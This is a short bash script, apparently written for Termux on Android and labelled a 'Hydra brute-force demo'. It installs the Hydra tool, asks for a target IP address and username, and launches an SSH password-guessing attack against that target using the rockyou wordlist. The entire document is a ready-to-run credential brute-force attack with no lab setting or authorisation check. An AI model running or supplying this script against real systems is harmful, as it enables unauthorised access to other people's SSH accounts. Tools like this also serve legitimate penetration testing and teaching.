#!/bin/bash
echo "[*] Starting Hydra brute-force demo..."
pkg install hydra -y
read -p "Target IP: " ip
read -p "Username: " user
hydra -l $user -P /data/data/com.termux/files/usr/share/wordlists/rockyou.txt ssh://$ip
